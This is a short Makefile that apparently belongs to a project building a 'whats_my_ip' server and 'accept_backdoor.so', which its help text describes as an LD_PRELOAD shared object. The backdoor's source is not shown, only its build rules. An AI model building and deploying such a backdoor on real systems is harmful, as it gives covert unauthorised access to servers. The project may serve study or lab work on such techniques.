CC = gcc
CFLAGS = -O3
SRCFILE=src/whats_my_ip.c
OUTFILE=whats_my_ip
SO_SRCFILE = src/accept_backdoor.c
SO_OUTFILE=accept_backdoor.so 

all: whats_my_ip accept_backdoor.so

whats_my_ip:
	$(CC) $(CFLAGS) $(SRCFILE) -o $(OUTFILE)

accept_backdoor.so:
	$(CC) $(CFLAGS) -FPIC -shared $(SO_SRCFILE) -o $(SO_OUTFILE) -ldl

accept_backdoor.so_debug:
	$(CC) $(CFLAGS) -DDEBUG -FPIC -shared $(SO_SRCFILE) -o $(SO_OUTFILE) -ldl

accept_backdoor.so_nocolor:
	$(CC) $(CFLAGS) -DDEBUG -DNOCOLOR -FPIC -shared $(SO_SRCFILE) -o $(SO_OUTFILE) -ldl

clean:
	rm -f whats_my_ip accept_backdoor.so

help:
	@echo "Default Target:"
	@echo "\t all => Build standard non-debug builds of the accept_backdoor.so and whats_my_ip"
	@echo "\nWhat's My IP Targets:"
	@echo "\t whats_my_ip => Build the whats_my_ip server application"
	@echo "\nAccept_Backdoor Targets:"
	@echo "\t accept_backdoor.so => Build the standard non-debug build of the accept_backdoor.so"
	@echo "\t accept_backdoor.so_debug => Build debug LD_PRELOAD accept_backdoor.so shared object."
	@echo "\t accept_backdoor.so_nocolor => Build non-colorized debug LD_PRELOAD accept_backdoor.so shared object."
	@echo "\nMaintance Targets:"
	@echo "\t clean => delete the binaries."
